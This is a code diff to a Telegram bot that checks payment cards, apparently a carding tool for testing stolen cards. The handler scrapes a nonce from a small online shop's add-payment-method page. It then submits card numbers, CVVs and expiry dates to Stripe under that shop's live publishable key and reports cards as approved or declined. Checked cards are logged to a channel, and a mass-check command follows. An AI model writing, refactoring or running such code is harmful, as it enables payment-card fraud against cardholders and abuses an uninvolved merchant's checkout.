@@ -1365,7 +1365,7 @@ def parseX(data, start, end):
         last = data.index(end, star)
         return data[star:last]
     except ValueError:
-        return "None"
+        return None  # Return None instead of "None" string
 
 # === CC Check Handler ===
 @app.on_message(filters.text & filters.regex(CC_REGEX))
@@ -1383,7 +1383,7 @@ async def check_card(client: Client, message: Message):
     proc_msg = await message.reply_text(
         f"↯ Checking..\n\n"
         f"⌯ 𝐂𝐚𝐫𝐝 - <code>{card}</code>\n"
-        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <code>{GATEWAY_NAME}</code>\n"
+        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <code>Stripe Auth</code>\n"
         f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - Processing"
     )
 
@@ -1395,100 +1395,86 @@ async def check_card(client: Client, message: Message):
         
         # Make the Stripe API requests
         async with aiohttp.ClientSession() as session:
-            headers = {
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                "accept-language": "en-US,en;q=0.9",
-                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
-            }
-
             # Step 1: Get nonce
-            req = await session.get(
-                "https://pixelpixiedesigns.com/my-account/add-payment-method/",
-                headers=headers
-            )
-            req_text = await req.text()
-            nonce = parseX(req_text, '"createAndConfirmSetupIntentNonce":"', '"')
-
-            # Step 2: Create payment method
-            headers2 = {
-                "accept": "application/json",
-                "content-type": "application/x-www-form-urlencoded",
-                "origin": "https://js.stripe.com",
-                "referer": "https://js.stripe.com/",
-                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
-            }
-
-            data2 = {
-                "type": "card",
-                "card[number]": cc,
-                "card[cvc]": cvv,
-                "card[exp_year]": year[-2:],  # Use 2-digit year
-                "card[exp_month]": mon,
-                "allow_redisplay": "unspecified",
-                "billing_details[address][postal_code]": "99501",
-                "billing_details[address][country]": "US",
-                "pasted_fields": "number",
-                "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
-                "referrer": "https://pixelpixiedesigns.com/",
-                "time_on_page": "187650",
-                "client_attribution_metadata[client_session_id]": "8c6ceb69-1a1d-4df7-aece-00f48946fa47",
-                "key": "pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF",
-                "_stripe_version": "2024-06-20",
-            }
-
-            req2 = await session.post(
-                "https://api.stripe.com/v1/payment_methods",
-                headers=headers2,
-                data=data2
-            )
-            req2_text = await req2.text()
-            pmid = parseX(req2_text, '"id": "', '"')
-
-            # Step 3: Confirm setup intent
-            headers3 = {
-                "accept": "*/*",
-                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "origin": "https://pixelpixiedesigns.com",
-                "referer": "https://pixelpixiedesigns.com/my-account/add-payment-method/",
-                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
-                "x-requested-with": "XMLHttpRequest",
-            }
+            try:
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+                }
+                async with session.get(
+                    "https://pixelpixiedesigns.com/my-account/add-payment-method/",
+                    headers=headers
+                ) as resp:
+                    req_text = await resp.text()
+                    nonce = parseX(req_text, '"createAndConfirmSetupIntentNonce":"', '"')
+                    if nonce is None:
+                        raise Exception("Failed to get authentication nonce")
             
-            data3 = {
-                "action": "create_and_confirm_setup_intent",
-                "wc-stripe-payment-method": pmid,
-                "wc-stripe-payment-type": "card",
-                "_ajax_nonce": nonce,
-            }
-            
-            req4 = await session.post(
-                "https://pixelpixiedesigns.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
-                headers=headers3,
-                data=data3
-            )
-            result_text = await req4.text()
+                # Step 2: Create payment method
+                headers2 = {
+                    "Accept": "application/json",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Origin": "https://js.stripe.com",
+                    "Referer": "https://js.stripe.com/",
+                }
+
+                data2 = {
+                    "type": "card",
+                    "card[number]": cc,
+                    "card[cvc]": cvv,
+                    "card[exp_month]": mon,
+                    "card[exp_year]": year[-2:],
+                    "billing_details[address][postal_code]": "10001",
+                    "billing_details[address][country]": "US",
+                    "key": "pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF",
+                }
+
+                async with session.post(
+                    "https://api.stripe.com/v1/payment_methods",
+                    headers=headers2,
+                    data=data2
+                ) as resp:
+                    req2_text = await resp.text()
+                    if '"error":' in req2_text:
+                        error_msg = parseX(req2_text, '"message": "', '"')
+                        raise Exception(error_msg or "Card declined by Stripe")
+                    
+                    pmid = parseX(req2_text, '"id": "', '"')
+                    if pmid is None:
+                        raise Exception("Failed to create payment method")
+
+                # Step 3: Confirm setup intent
+                data3 = {
+                    "action": "create_and_confirm_setup_intent",
+                    "wc-stripe-payment-method": pmid,
+                    "wc-stripe-payment-type": "card",
+                    "_ajax_nonce": nonce,
+                }
+                
+                async with session.post(
+                    "https://pixelpixiedesigns.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
+                    headers=headers,
+                    data=data3
+                ) as resp:
+                    result_text = await resp.text()
+                    if '"status":"succeeded"' in result_text:
+                        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
+                        response_msg = "Card charged successfully"
+                    else:
+                        error_msg = parseX(result_text, '"message":"', '"')
+                        raise Exception(error_msg or "Payment failed")
+
+            except Exception as e:
+                raise Exception(f"Stripe error: {str(e)}")
 
         elapsed = round(time.time() - start_time, 2)
 
-        # Parse the response
-        if '"status":"succeeded"' in result_text:
-            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
-            response_msg = "Card successfully charged"
-        elif '"error":' in result_text:
-            error_msg = parseX(result_text, '"message":"', '"')
-            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-            response_msg = error_msg if error_msg else "Card declined"
-        else:
-            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-            response_msg = "Unknown response from gateway"
-
-        # Format the final message (same format as before)
+        # Format the final message
         final_msg = (
             f"┏━━━━━━━⍟\n"
             f"┃ {status}\n"
             f"┗━━━━━━━━━━━⊛\n\n"
             f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{card}</code>\n"
-            f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <code>{GATEWAY_NAME}</code>\n"
+            f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <code>Stripe Auth</code>\n"
             f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <code>{response_msg}</code>\n\n"
             f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
             f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
@@ -1499,19 +1485,22 @@ async def check_card(client: Client, message: Message):
         )
 
         await proc_msg.edit(final_msg, parse_mode=ParseMode.HTML)
-        
-        # Log to channel
         await log_to_channel(client, "CC", message, card, status)
 
     except Exception as e:
         elapsed = round(time.time() - start_time, 2)
-        error_msg = f"Error: {str(e)}"
+        error_msg = str(e)
         await proc_msg.edit(
-            f"❌ Error processing card:\n{error_msg}\n"
-            f"Time: {elapsed}s",
+            f"┏━━━━━━━⍟\n"
+            f"┃ Error ❌\n"
+            f"┗━━━━━━━━━━━⊛\n\n"
+            f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{card}</code>\n"
+            f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <code>Stripe Auth</code>\n"
+            f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <code>{error_msg}</code>\n\n"
+            f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬",
             parse_mode=ParseMode.HTML
         )
-        await log_to_channel(client, "CC", message, card, f"Error: {str(e)}")
+        await log_to_channel(client, "CC", message, card, f"Error: {error_msg}")
 # === Mass CC Check Handler ===
 @app.on_message(filters.command("mchk", prefixes="/") & (filters.reply | filters.text))
 async def mass_check_handler(client: Client, message: Message):
